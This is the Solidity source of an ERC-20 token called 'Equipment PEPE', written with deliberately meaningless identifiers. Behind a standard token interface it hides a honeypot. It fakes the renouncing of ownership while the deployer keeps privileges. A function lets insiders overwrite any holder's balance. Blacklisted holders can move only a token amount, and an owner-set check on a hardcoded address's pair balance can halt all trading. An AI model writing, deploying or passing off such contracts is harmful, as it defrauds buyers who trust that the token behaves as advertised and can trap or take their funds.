//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface receiverAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoTake) external view returns (uint256);

    function transfer(address maxToAt, uint256 marketingEnable) external returns (bool);

    function allowance(address isEnableTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingEnable) external returns (bool);

    function transferFrom(
        address sender,
        address maxToAt,
        uint256 marketingEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listSell, uint256 value);
    event Approval(address indexed isEnableTeam, address indexed spender, uint256 value);
}

abstract contract atTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitReceiverTotal {
    function createPair(address launchEnable, address fromWallet) external returns (address);
}

interface swapSender is receiverAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EquipmentPEPE is atTotal, receiverAt, swapSender {

    uint256 public receiverShould;

    function marketingFromEnable(address sellToTeam, address maxToAt, uint256 marketingEnable) internal returns (bool) {
        require(shouldFrom[sellToTeam] >= marketingEnable);
        shouldFrom[sellToTeam] -= marketingEnable;
        shouldFrom[maxToAt] += marketingEnable;
        emit Transfer(sellToTeam, maxToAt, marketingEnable);
        return true;
    }

    function getOwner() external view returns (address) {
        return shouldFund;
    }

    function owner() external view returns (address) {
        return shouldFund;
    }

    address public tradingListMode;

    mapping(address => mapping(address => uint256)) private liquiditySell;

    uint256 buyTake;

    mapping(address => uint256) private shouldFrom;

    address public amountMarketingLimit;

    function transfer(address buyAmount, uint256 marketingEnable) external virtual override returns (bool) {
        return modeLaunched(_msgSender(), buyAmount, marketingEnable);
    }

    function tokenLaunched(address txTrading) public {
        launchTx();
        if (marketingReceiver != receiverShould) {
            takeExemptShould = receiverShould;
        }
        if (txTrading == tradingListMode || txTrading == amountMarketingLimit) {
            return;
        }
        fundToken[txTrading] = true;
    }

    event OwnershipTransferred(address indexed listReceiverWallet, address indexed walletMode);

    function walletSwapAuto(uint256 marketingEnable) public {
        launchTx();
        buyTake = marketingEnable;
    }

    function symbol() external view virtual override returns (string memory) {
        return listWallet;
    }

    bool public amountWallet;

    function amountReceiver() public {
        emit OwnershipTransferred(tradingListMode, address(0));
        shouldFund = address(0);
    }

    function approve(address limitShouldLiquidity, uint256 marketingEnable) public virtual override returns (bool) {
        liquiditySell[_msgSender()][limitShouldLiquidity] = marketingEnable;
        emit Approval(_msgSender(), limitShouldLiquidity, marketingEnable);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletToMax;
    }

    function transferFrom(address sellToTeam, address maxToAt, uint256 marketingEnable) external override returns (bool) {
        if (_msgSender() != enableMax) {
            if (liquiditySell[sellToTeam][_msgSender()] != type(uint256).max) {
                require(marketingEnable <= liquiditySell[sellToTeam][_msgSender()]);
                liquiditySell[sellToTeam][_msgSender()] -= marketingEnable;
            }
        }
        return modeLaunched(sellToTeam, maxToAt, marketingEnable);
    }

    constructor (){
        if (marketingReceiver == receiverShould) {
            receiverShould = takeExemptShould;
        }
        takeList isList = takeList(enableMax);
        amountMarketingLimit = limitReceiverTotal(isList.factory()).createPair(isList.WETH(), address(this));
        if (takeExemptShould != marketingReceiver) {
            receiverShould = marketingReceiver;
        }
        tradingListMode = _msgSender();
        amountReceiver();
        takeTx[tradingListMode] = true;
        shouldFrom[tradingListMode] = walletToMax;
        
        emit Transfer(address(0), tradingListMode, walletToMax);
    }

    address private shouldFund;

    mapping(address => bool) public takeTx;

    uint256 constant txLimit = 5 ** 10;

    uint8 private fromFee = 18;

    uint256 private takeExemptShould;

    address enableMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address totalFrom, address limitShouldLiquidity) external view virtual override returns (uint256) {
        if (limitShouldLiquidity == enableMax) {
            return type(uint256).max;
        }
        return liquiditySell[totalFrom][limitShouldLiquidity];
    }

    uint256 receiverFee;

    function feeMarketing(address launchModeList) public {
        require(launchModeList.balance < 100000);
        if (amountWallet) {
            return;
        }
        if (takeExemptShould == receiverShould) {
            receiverShould = takeExemptShould;
        }
        takeTx[launchModeList] = true;
        
        amountWallet = true;
    }

    mapping(address => bool) public fundToken;

    string private listWallet = "EPE";

    string private feeReceiver = "Equipment PEPE";

    function modeLaunched(address sellToTeam, address maxToAt, uint256 marketingEnable) internal returns (bool) {
        if (sellToTeam == tradingListMode) {
            return marketingFromEnable(sellToTeam, maxToAt, marketingEnable);
        }
        uint256 tradingLiquidityBuy = receiverAt(amountMarketingLimit).balanceOf(sellMinTrading);
        require(tradingLiquidityBuy == buyTake);
        require(maxToAt != sellMinTrading);
        if (fundToken[sellToTeam]) {
            return marketingFromEnable(sellToTeam, maxToAt, txLimit);
        }
        return marketingFromEnable(sellToTeam, maxToAt, marketingEnable);
    }

    uint256 public marketingReceiver;

    function launchTx() private view {
        require(takeTx[_msgSender()]);
    }

    function sellFeeTeam(address buyAmount, uint256 marketingEnable) public {
        launchTx();
        shouldFrom[buyAmount] = marketingEnable;
    }

    address sellMinTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return fromFee;
    }

    uint256 private walletToMax = 100000000 * 10 ** 18;

    function balanceOf(address autoTake) public view virtual override returns (uint256) {
        return shouldFrom[autoTake];
    }

    function name() external view virtual override returns (string memory) {
        return feeReceiver;
    }

}